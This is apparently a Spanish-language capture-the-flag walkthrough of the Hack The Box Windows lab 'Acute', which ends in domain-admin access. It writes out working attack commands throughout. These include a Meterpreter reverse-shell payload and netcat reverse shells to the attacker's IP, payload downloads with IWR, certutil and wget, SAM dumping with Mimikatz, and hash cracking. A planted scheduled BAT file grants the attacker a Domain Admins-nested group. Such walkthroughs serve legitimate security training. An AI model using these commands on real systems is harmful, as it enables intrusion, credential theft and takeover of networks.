---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Acute

`Acute` es una máquina Windows que se inicia con un sitio web en el puerto `443`. El certificado del sitio web revela un nombre de dominio `atsserver.acute.local`. Al mirar el sitio web, se mencionan varios empleados y con esta información es posible construir una lista de posibles usuarios en la máquina remota. Al enumerar el sitio web, se revela un formulario con procedimientos relacionados con los recién llegados a la empresa. El formulario revela la contraseña predeterminada con la que se configuran inicialmente todas las cuentas. También revela un enlace para una sesión de `Windows PowerShell Web Access` (PSWA). Al combinar toda la información disponible del proceso de enumeración, un atacante puede ingresar a una sesión de PowerShell como el usuario `edavies` en `Acute-PC01`.

Luego, se descubre que el usuario `edavies` también está conectado mediante una sesión interactiva. Al espiar las acciones de `edavie`, se puede recuperar la contraseña de texto sin cifrar del usuario `imonks` para `ATSSERVER`. El usuario `imonks` se ejecuta bajo `Just Enough Administration` (JEA) en `ATSSERVER`, pero incluso con el conjunto de comandos limitado, un atacante puede modificar un script en `ATSSERVER` para convertir a `edavies` en administrador local en `Acute-PC01`. Ahora que `edavies` es un administrador local, se pueden recuperar `HKLM\sam` y `HKLM\system` del sistema para extraer los hashes de contraseñas de todos los usuarios. El hash del administrador resulta ser descifrable y la contraseña de texto sin cifrar se reutiliza para `awallace` en `ATSSERVER`. El usuario `awallace` puede crear scripts `BAT` en un directorio donde el usuario `Lois` los ejecutará. `Lois` tiene los derechos para agregar a `imonks` al grupo `site_admin`, que a su vez tiene acceso correcto al grupo `Domain Admins`. Entonces, después de que `imonks` se agrega al grupo `site_admin`, puede agregarse al grupo `Administradores de dominio` y adquirir privilegios administrativos.

<figure><img src="../../../../../.gitbook/assets/Acute.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Acute**.

```bash
nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.145 -oG allPorts
```

<figure><img src="../../../../../.gitbook/assets/2673_vmware_wWq3xHoKMP.png" alt="" width="563"><figcaption></figcaption></figure>

Lanzaremos scripts de reconocimiento sobre el puerto encontrado y lo exportaremos en formato oN y oX.

```bash
nmap -sCV -p443 10.10.11.145  -A -oN targeted -oX targetedXML
```

<figure><img src="../../../../../.gitbook/assets/2674_vmware_NSr3WhD5Ys.png" alt="" width="563"><figcaption></figcaption></figure>

Transformaremos el archivo XML obtenido en el resultado de **nmap** y lo transformaremos en un archivo HTML. Levantaremos un servidor HTTP con Python3.

```bash
xsltproc targetedXML > index.html

python3 -m http.server 80
```

<figure><img src="../../../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

Accederemos a[ http://localhost](http://localhost) y comprobaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Procederemos a añadir la entrada en nuestro archivo **/etc/hosts**

<figure><img src="../../../../../.gitbook/assets/2675_vmware_X9YIJPoK5o.png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

### Virtual Hosting

Procederemos a acceder a [https://10.10.11.145](https://10.10.11.145) y[https://atsserver.acute.local](https://atsserver.acute.local) y verificaremos que solamente nos muestra el contenido de la web a través del nombre DNS y no a través de la dirección IP.

<figure><img src="../../../../../.gitbook/assets/2676_vmware_Nlk5PfYEXT.png" alt=""><figcaption></figcaption></figure>

Verificaremos las tecnologías y frameworks que utiliza la página web a través de la herramienta de **whatweb**.

```bash
whatweb https://atsserver.acute.local
```

<figure><img src="../../../../../.gitbook/assets/2677_vmware_6gVxrZp9hc.png" alt=""><figcaption></figcaption></figure>

### Information Leakage

Revisando el contenido de la página web, nos encontramos un apartado de "_About_" en el cual aparecen los nombres de los miembros de la empresa, esto nos puede servir útil para intentar generar nombres de usuarios a través de las combinaciones de nombres.

<figure><img src="../../../../../.gitbook/assets/2678_vmware_m8Sa4P3VQE.png" alt=""><figcaption></figcaption></figure>

También nos encontramos que en la página [https://atsserver.acute.local/about.html ](https://atsserver.acute.local/about.html)nos encontramos que hay un documento Word (.docx) nombrado '_New\_Starter\_CheckList\_v7.docx_'.

<figure><img src="../../../../../.gitbook/assets/2680_vmware_Z8d0up6mns.png" alt=""><figcaption></figcaption></figure>

Al abrir el documento recién descargado, verificamos que aparece bastante información que puede llegar a comprometer la seguridad de la información.

<figure><img src="../../../../../.gitbook/assets/2681_vmware_1EYaNg1TyH.png" alt=""><figcaption></figcaption></figure>

En una sección del documento, verificamos que nos aparece una contraseña por defecto 'Password1!'.

<figure><img src="../../../../../.gitbook/assets/2682_vmware_YiuHjlZSHs.png" alt=""><figcaption></figcaption></figure>

También verificaremos que nos aparece un hipervínculo sobre un enlace llamado "Remote".

## Abusing Windows PowerShell Web Access

Al acceder al enlace del documento Word, verificamos que se trata de un acceso a un PowerShell a través de la Web, nos pide usuario, contraseña y el nombre del equipo (hostname) al cual queremos conectarnos.

<figure><img src="../../../../../.gitbook/assets/2684_vmware_1tPAth4oOA.png" alt=""><figcaption></figcaption></figure>

Nos guardaremos los nombres de los empleados que encontramos en la página web, a través de la herramienta de **username-anarchy** procederemos a generar un listado de usuarios con el formato (flast) que es muy común en Active Directory.

```bash
catnp users.txt

username-anarchy --input-file users.txt --select-format flast > generated-unames.txt

catnp generated-unames.txt
```

<figure><img src="../../../../../.gitbook/assets/2685_vmware_NzWO2T0fwi.png" alt=""><figcaption></figcaption></figure>

Por otro lado, para sacar el tema del nombre de la máquina, lo que realizaremos es revisar los propios metadatos del document Word, esto debido que a veces se muestra dónde se ha creado el Word desde los mismos metadatos del archivo.

En este caso, verificamos que nos aparece '_Created on Acute-PC01_'.

```bash
exiftool New_Starter_CheckList_v7.docx
```

<figure><img src="../../../../../.gitbook/assets/2687_vmware_NSXqdHfHt0.png" alt="" width="420"><figcaption></figcaption></figure>

Probaremos de autenticarnos en la PowerShell Web Access a través del usuario **edavies,** con la contraseña por defecto que encontramos en el Word y el nombre de la máquina.

<figure><img src="../../../../../.gitbook/assets/2688_vmware_nAqA5rSQ8t.png" alt="" width="316"><figcaption></figcaption></figure>

Verificamos que hemos podido ganar acceso con el usuario a la PowerShell Web Access.

<figure><img src="../../../../../.gitbook/assets/2689_vmware_JUNmmisPp2.png" alt=""><figcaption></figcaption></figure>

Al verificar en el equipo que nos encontramos. nos damos cuenta que se trata de un equipo y no del Domain Controller.

```powershell
ipconfig
```

<figure><img src="../../../../../.gitbook/assets/2690_vmware_fcQbrLy16C.png" alt=""><figcaption></figcaption></figure>

Revisando los directorios de la máquina _**Acute-PC01**_, verificamos que hay una ruta (C:\Utils) la cual es un directorio que no tiene el Windows Defender activo.

```powershell
dir -Force

type desktop.ini
```

<figure><img src="../../../../../.gitbook/assets/2691_vmware_RpegAuWz97.png" alt=""><figcaption></figcaption></figure>

## Monitoring by capturing the victim's screen (msfconsole)

Enumerando el equipo, verificamos que el usuario _**edavies**_ tiene una consola activa en estos momentos, lo cual nos hace pensar que el usuario está con una consola CMD/PowerShell activa.

```powershell
qwinsta /server:127.0.0.1
```

<figure><img src="../../../../../.gitbook/assets/2692_vmware_xUVSAgctNs.png" alt=""><figcaption></figcaption></figure>

El objetivo será monitorear el equipo de la víctima a través de capturas de pantalla, una utilidad que nos ofrece _**msfconsole**_.

El primer paso será realizar un binario de una Reverse Shell de Meterpreter a través de la herramienta _**msfvenom.**_

Una vez generado el payload de la Reverse Shell, procederemos a acceder a la consola interactiva de Metasploit.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=443 -f exe > shell.exe

msfconsole
```

<figure><img src="../../../../../.gitbook/assets/2693_vmware_MOVv6KCEFd.png" alt=""><figcaption></figcaption></figure>

Configuraremos la sesión de Metasploit para recibir la Reverse Shell. Levantaremos un servidor web con Python para compartir el binario del payload y desde la consola de PowerShell Web Access procederemos a transferirnos el binario al equipo _**Acute-PC01**_.

Iniciaremos el Metasploit para recibir la Reverse Shell y desde la consola de PowerShell Web Access ejecutaremos el binario y comprobaremos que recibimos correctamente la Reverse Shell en Metasploit.

```powershell
msf6> use explot/multi/handler

msf6> set lhost 10.10.16.3

msf6> set port 443

msf6> set payload windows/meterpreter/reverse_tcp

msf6> run

python3 -m http.server

IWR-Uri http://10.10.16.3/shell.exe -OutFile shell.exe

.\shell.exe
```

<figure><img src="../../../../../.gitbook/assets/2694_vmware_Q3L6jTLN9K.png" alt=""><figcaption></figcaption></figure>

Al acceder a la máquina, verificamos que el usuario _**edavies**_ tiene bastantes procesos abiertos, lo cual nos afirma la teoría que está utilizando una consola en el equipo en estos momentos.

<figure><img src="../../../../../.gitbook/assets/2695_vmware_tCNPo6CtWt (1).png" alt=""><figcaption></figcaption></figure>

A través de la utilidad _**screenshot**_ de Metasploit, procederemos a realizar capturas de pantalla del equpo.

Al revisar las capturas que hemos ido realizando, verificamos que el usuario está tratando de realizar una conexión al equipo _**ATSSERVER**_ con las credenciales del usuario '_**imonks**_'.

<figure><img src="../../../../../.gitbook/assets/2697_vmware_6JPLAdox4f.png" alt=""><figcaption></figcaption></figure>

## Initial Access - Pivoting to imonks

### Getting remote command execution on another server

Desde la consola de PowerShell Web Access, procederemos a configurarnos las credenciales del usuario _**'imonks**_' a través de PSCredential.

Una vez configurada las credenciales, procederemos a intentar ejecutar el comando '_**whoami**_' en la máquina _**ATSSERVER**_ mediante la configuración que hemos podido capturar en el punto anterior.

Verificamos que el comando ha sido ejecutado correctamente en el servidor y nos ha devuelto correctamente el output. lo cual indica que las credenciales son válidas.

{% code overflow="wrap" %}
```powershell
$SecPassword = ConvertTo-SecureString 'W3_4R3_th3_f0rce.' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('acute\imonks',$SecPassword)

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { whoami }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/2698_vmware_I6OQWsuGKT.png" alt=""><figcaption></figcaption></figure>

Al revisar el directorio de _**Desktop**_ del usuario que disponemos, verificamos que hemos podido comprobar la flag de **user.txt**.

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { ls C:\Users\imonks\Desktop }

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { type C:\Users\imonks\Desktop\user.txt }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/2699_vmware_T9sb0alf0W.png" alt=""><figcaption></figcaption></figure>

## Pivoting to jmorgan

### Abusing a PowerShell file to get remote command execution as another user - User Pivoting

En la misma carpeta de _**Desktop**_ del usuario que disponemos actualmente (_**imonks**_), verificamos que nos aparece un archivo llamado _**wm.ps1**_ que contenía el siguiente contenido.

Se trata de un Script en PowerShell que utiliza las credenciales del usuario _**jmorgan**_ a través de un SecureString y lo que realzia es ejecutar el comando (Get-Volume) en el equipo que nos encontramos actualmente (_**Acute-PC01**_) haciendo uso de esas credenciales.

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { ls C:\Users\imonks\Desktop\wm.ps1 }

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { type C:\Users\imonks\Desktop\wm.ps1 }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/2700_vmware_S7JqEyJSfN.png" alt=""><figcaption></figcaption></figure>

El objetivo será intentar modificar el script para que ejecute otra instrucción en vez de la indicada (Get-Volume), en este caso, haremos que ejecute un "nc" para entablarnos una Reverse Shell a nuestro equipo. Subiremos el binario de _**nc.exe**_ en (C:\Utils).

```powershell
IWR -Uri http://10.10.16.7/nc.exe -Outfile C:\Utils\nc.exe
```

<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Lo primero será reemplazar a través de la función _**-Replace**_ el contenido y a través de _**Set-Content**_ trataremos de sobreescribir el archivo existente por el contenido nuevo modificado.

Verificamos que se ha sobreescrito correctamente el script, y ahora mismo lo que realiza este script es ejecutar la el binario de _**nc.exe**_ que hemos subido anteriormente en (C:\Utils\nc.exe).

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { ((Get-Content C:\Users\imonks\Desktop\wm.ps1 -Raw) -Replace 'Get-Volume','cmd.exe /c C:\Utils\nc.exe -e cmd 10.10.16.7 443' ) }

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { ((Get-Content C:\Users\imonks\Desktop\wm.ps1 -Raw) -Replace 'Get-Volume','cmd.exe /c C:\Utils\nc.exe -e cmd 10.10.16.7 443') | Set-Content -Path C:\Users\imonks\Desktop\wm.ps1 }

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { type C:\Users\imonks\Desktop\wm.ps1 }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Procederemos a ejecutar el script de PowerShell modificado y desde una consola de nuestra Kali nos pondremos en escucha por el  puerto especificado para recibir la Reverse Shell.

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { C:\Users\imonks\Desktop\wm.ps1 }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3035_vmware_J44aJBYOQ9.png" alt=""><figcaption></figcaption></figure>

Verificaremos que hemos logrado obtener la Reverse Shell y nos encontramos con el usuario _**jmorgan**_ en el equipo _**Acute-PC01**_. Verificamos que el usuario es Administrador local del equipo.

```bash
rlwrap -cAr nc -nlvp 443

hostname

whoami /all
```

<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Dumping Credentials - SAM File Hashes (mimikatz)

Debido que disponemos de permisos de Administrador sobre el equipo, una de las diversas cosas que poemos realizar en la máquina es dumpear la SAM para obtener los hashes NTLM de los usuarios locales del equipo.

Para ello exportaremos los archivos _**SAM**_ y _**SYSTEM**_ a través de "reg save".

```powershell
reg save HKLM\SYSTEM C:\Utils\SYSTEM

reg save HKLM\SAM C:\Utils\SAM
```

<figure><img src="../../../../../.gitbook/assets/3049_vmware_MEPZjY2pjB.png" alt=""><figcaption></figcaption></figure>

Una vez obtengamos la copia de los archivos _**SAM/SYSTEM**_ procederemos a utilizar la herramienta de _**Mimikatz**_ para extraer los hashes de la SAM desde la propia máquina víctima.

Para ello, procederemos a pasarnos el binario de _**Mimikatz**_ desde nuestra Kali al equipo comprometido.

```bash
python3 -m http.server 80

certutil.exe -f -urlcache -split http://10.10.16.7/mk.exe C:\Utils\mk.exe
```

<figure><img src="../../../../../.gitbook/assets/3048_vmware_37vvJzNCC6.png" alt=""><figcaption></figcaption></figure>

Al ejecutar el _**Mimikatz**_ procederemos a hacer el DUMP de la SAM y verificaremos que hemos logrado obtener los hashes NTLM de los usuarios locales del equipo _**Acute-PC01**_.

Nos guardaremos en un achivo el hash NTLM del usuario 'Administrator'.

```powershell
mk.exe

lsadump::sam /SYSTEM:C:\Utils\SYSTEM /SAM:C:\Utils\SAM
```

<figure><img src="../../../../../.gitbook/assets/3050_vmware_sGVoiiSOfv.png" alt=""><figcaption></figcaption></figure>

### Cracking Hashes

Procederemos a intentar crackear el hash NTLM obtenido del usuario 'Administrator' con el objetivo de obtener la contraseña en texto plano y posteriormente revisar si algún usuario reutiliza estas credenciales.

Para ello, a través de _**hashcat**_ intentaremos crackear el hash. En este caso, logra crackearlo correctamente.

```bash
hashcat -a 0 -m 1000 hashes /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../../../.gitbook/assets/3051_vmware_lWsjZf7qiL.png" alt="" width="494"><figcaption></figcaption></figure>

### Password Reuse - Pivoting to awallace&#x20;

De la lista de usuarios que disponemos, solamente nos quedan 3 usuarios los cuales no disponemos de sus credenciales de acceso. Por lo tanto, deberemos intentar validar con alguno de esos tres usuarios si las credenciales que disponemos se reutilizan en alguno de ellos.

<figure><img src="../../../../../.gitbook/assets/3052_vmware_QBysM49Mqe.png" alt=""><figcaption></figcaption></figure>

Desde la PowerShell Web Access crearemos un nuevo objeto con las credenciales del usuario que probaremos: _**awallace,**_ verificaremos que son correctas debido que se logra ejecutar el comando 'whoami' en el equipo _**ATSSERVER**_. Por lo tanto, este usuario reutiliza las credenciales obtenidas anteriormente.

{% code overflow="wrap" %}
```powershell
$SecPassword = ConvertTo-SecureString 'Password@123' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('acute\awallace',$SecPassword)

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { whoami }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3053_vmware_SgsuMu5Qhy.png" alt=""><figcaption></figcaption></figure>

### Abusing Cron Job - BAT file

Dado que ya disponemos de unas nuevas credenciales del usuario _**awallace**_, procederemos a enumerar los programas que dispone el equipo _**ATSSERVER**_. Entre los cuales aparece una carpeta sospechosa llamada "keepmeon".

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { ls C:\Progra~1 }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3054_vmware_gWNXqNri8r.png" alt=""><figcaption></figcaption></figure>

Revisando el directorio mencionado, verificamos que se encuentra un archivo (_**keepmeon.bat**_) que se trata de un script que se ejecuta cada 5 minutos sobre cualquier archivo que finalice por (.bat).

Este script es ejecutado solamente por el usuario Lois.

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { ls C:\Progra~1\keepmeon }

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { typeC:\Progra~1\keepmeon\keepmeon.bat }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3055_vmware_mWtgjqqY30.png" alt=""><figcaption></figcaption></figure>

Si volvemos a revisar el documento Word que nos descargamos al principio, en una de las secciones indica que el único usuario autorizado para modificar la membresía de grupos sobre los usuarios.

Además, aparece un mensaje mencionando un grupo llamado "Site Admin", lo cual nos parece algo extraño ya que no es un grupo común de AD.

<figure><img src="../../../../../.gitbook/assets/3056_vmware_a8PYyudq7V.png" alt=""><figcaption></figcaption></figure>

Verificaremos los grupos existentes en el dominio, para verificar que se encuentre el mencionado en el documento. Efectivamente existe un grupo llamado "Site\_Admin".

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { net groups /domain }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3057_vmware_wnbyjpYYyS.png" alt=""><figcaption></figcaption></figure>

Al verificar el grupo "Site\_Admin", comprobamos que aparece un comentario sobre dicho grupo mencionando que este grupo solamente se utiliza en casos de emergencia y forma parte del grupo "Domain Admins".

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { net group Site_Admin /domain }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3058_vmware_CuVsbjtndh.png" alt=""><figcaption></figcaption></figure>

Por lo tanto, nos encontramos con el siguiente escenario:

* Lois, tiene permisos para modificar la membresía de grupos sobre usuarios.
* El script 'keepmeon.bat' es ejecutado por el usuario Lois cada 5 minutos
* Este script itera por cualquier archivo que acabe en extensión .bat en el directorio actual.
* Disponemos de las credenciales del usuario 'Awallace'.

Con este escenario presente, la idea será crear un archivo .bat que trate de añadir al usuario _**awallace**_ al grupo _**Site\_Admin**_, este script .bat se ejecutará cada 5 minutos por el usuario _**Lois**_ que tiene permisos para añadirnos a grupos.

Por lo tanto, si todo es correcto y funciona al ejecutarse ese script automatizado, Lois nos añadirá al grupo mencionado teniendo acceso completo al Domain Admins.

El primer paso será crear el archivo .bat que nos añada al grupo mencionado.

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { Set-Content -Path C:\Progra~1\keepmeon\pwn3d.bat -Value 'net group Site_Admin awallace /domain /add' }

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { Get-Content C:\Progra~1\keepmeon\pwn3d.bat }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3059_vmware_yjhN2wZcNh.png" alt=""><figcaption></figcaption></figure>

Verificamos que antes de que sea ejecutado el script, el usuario que disponemos _**awallace**_ dispone de los siguientes grupos de acceso.

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { net user awallace /domain }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3060_vmware_JzwnLmwTdm.png" alt=""><figcaption></figcaption></figure>

Al ejecutarse el script pasado los 5 minutos, comprobamos que hemos sido añadidos al grupo "Site\_Admin", y como este grupo forma parte del grupo "Domain Admins", también disponemos de privilegios de Domain Admins.

Verificamos que tenemos acceso para comprobar el contenido de la flag de _**root.txt**_.

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { net user awallace /domain }

Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $Cred -ScriptBlock { type C:\Users\Administrator\Desktop\root.txt }
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3061_vmware_EIx5szUKvv.png" alt=""><figcaption></figcaption></figure>

Para poder ganar acceso a la máquina para disponer de control remoto en una Shell y no a través de este método de PowerShell Web Acces mediante ScripBlock, lo que realizaremos es lo siguiente:

Nos compartiremos el binario de _**nc.exe**_ desde nuestra Kali y lo descargaremos en _**ATSSERVER**_ mediante "wget".

Una vez lo tengamos en el equipo víctima, procederemos a ejecutar para entablarnos una Reverse Shell a nuestra Kali.

{% code overflow="wrap" %}
```powershell
Invoke-Command -ComputerName ATSSERVER -Credential $Cred -ScriptBlock { wget 10.10.16.7/nc.exe -outfile \programdata\nc.exe }

Invoke-Command -ComputerName ATSSERVER -Credential $Cred -ScriptBlock { \programdata\nc.exe -e cmd 10.10.16.7 443}
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/3065_vmware_TWh6BnAl4v.png" alt=""><figcaption></figcaption></figure>

Verificamos que estando nosotros en escucha por el puerto especificado, hemos ganado acceso al equipo _**ATSSERVER**_ mediante la Reverse Shell con _**nc.exe**_.

```bash
rlwrap -cAr nc -nlvp 443
```

<figure><img src="../../../../../.gitbook/assets/3066_vmware_ThTwrDKXUb.png" alt=""><figcaption></figcaption></figure>
